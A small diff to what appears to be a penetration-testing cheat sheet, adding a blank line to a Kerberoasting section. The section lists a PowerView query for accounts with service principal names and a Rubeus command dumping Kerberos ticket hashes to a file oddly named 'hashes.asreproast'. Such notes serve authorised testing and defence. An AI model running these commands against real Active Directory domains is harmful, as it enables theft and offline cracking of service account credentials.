@@ -1,6 +1,7 @@
 ### Kerberoasting 
 ```
 PowerShell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
+
 Rubeus kerberoast /outfile:hashes.asreproast
 
 
